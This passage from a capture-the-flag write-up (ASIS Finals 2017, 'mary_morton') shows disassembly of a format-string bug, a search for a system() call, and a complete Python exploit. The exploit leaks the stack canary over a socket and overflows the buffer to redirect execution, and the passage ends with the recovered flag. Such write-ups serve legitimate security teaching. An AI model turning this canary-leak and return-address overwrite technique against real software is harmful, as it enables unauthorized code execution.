&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ (fcn) sub.read_8eb 117
|   sub.read_8eb ();
|           ; var int local_90h @ rbp-0x90
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x004008b3 (main)
|           0x004008eb      55             push rbp
|           0x004008ec      4889e5         mov rbp, rsp
|           0x004008ef      4881ec900000.  sub rsp, 0x90
|           0x004008f6      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x004008ff      488945f8       mov qword [local_8h], rax
|           0x00400903      31c0           xor eax, eax
|           0x00400905      488d9570ffff.  lea rdx, qword [local_90h]
|           0x0040090c      b800000000     mov eax, 0
|           0x00400911      b910000000     mov ecx, 0x10
|           0x00400916      4889d7         mov rdi, rdx
|           0x00400919      f348ab         rep stosq qword [rdi], rax
|           0x0040091c      488d8570ffff.  lea rax, qword [local_90h]
|           0x00400923      ba7f000000     mov edx, 0x7f               ; size_t nbyte
|           0x00400928      4889c6         mov rsi, rax                ; void *buf
|           0x0040092b      bf00000000     mov edi, 0                  ; int fildes
|           0x00400930      e89bfdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400935      488d8570ffff.  lea rax, qword [local_90h]
|           0x0040093c      4889c7         mov rdi, rax                ; const char * format
|           0x0040093f      b800000000     mov eax, 0
|           0x00400944      e867fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400949      90             nop
|           0x0040094a      488b45f8       mov rax, qword [local_8h]
|           0x0040094e      644833042528.  xor rax, qword fs:[0x28]
|       ,=&amp;lt; 0x00400957      7405           je 0x40095e
|       |   0x00400959      e832fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-&amp;gt; 0x0040095e      c9             leave
\           0x0040095f      c3             ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This part doesn’t need much explaining, does it?
We simply use the format string attack to recover the canary from the stack and since the canary stays the same for the lifetime of the process, we can simply use it in our buffer overflow.&lt;/p&gt;

&lt;h3 id=&quot;finding-a-return-address&quot;&gt;Finding a Return Address&lt;/h3&gt;

&lt;p&gt;Now the last mystery is the address that we ought to return to.
A look at the imported functions might give us some useful hints.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ordinal=001 plt=0x00400680 bind=GLOBAL type=FUNC name=puts
ordinal=002 plt=0x00400690 bind=GLOBAL type=FUNC name=__stack_chk_fail
ordinal=003 plt=0x004006a0 bind=GLOBAL type=FUNC name=system
ordinal=004 plt=0x004006b0 bind=GLOBAL type=FUNC name=printf
ordinal=005 plt=0x004006c0 bind=GLOBAL type=FUNC name=alarm
ordinal=006 plt=0x004006d0 bind=GLOBAL type=FUNC name=read
ordinal=007 plt=0x004006e0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=008 plt=0x00400000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=009 plt=0x004006f0 bind=GLOBAL type=FUNC name=setvbuf
ordinal=010 plt=0x00400700 bind=GLOBAL type=FUNC name=__isoc99_scanf
ordinal=011 plt=0x00400710 bind=GLOBAL type=FUNC name=exit
ordinal=008 plt=0x00400000 bind=WEAK type=NOTYPE name=__gmon_start__
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; is just what we are looking for and as it turns out, there is a call to system at 0x4008e3:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            0x004008da      55             push rbp
            0x004008db      4889e5         mov rbp, rsp
            0x004008de      bf2b0b4000     mov edi, str._bin_cat_._flag ; 0x400b2b ; &quot;/bin/cat ./flag&quot;
            0x004008e3      e8b8fdffff     call sym.imp.system         ; int system(const char *string)
            0x004008e8      90             nop
            0x004008e9      5d             pop rbp
            0x004008ea      c3             ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This looks just like a function!
A perfect candidate for our return address.&lt;/p&gt;

&lt;h3 id=&quot;the-exploit&quot;&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;The following script is an implementation of our exploit:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;146.185.132.36&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19153&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;format_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x004008da&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format_str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;41&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;00000000004008da&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And we have the flag: ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}&lt;/p&gt;</content><author><name>3553x</name></author><category term="ASIS Finals 2017" /><summary type="html">We determine that the downloaded file is a xz compressed tar archive by using the UNIX file utility. mary_morton_f3555213d54602a8e5a40fe0435adcf84e8eff71: XZ compressed data</summary></entry></feed>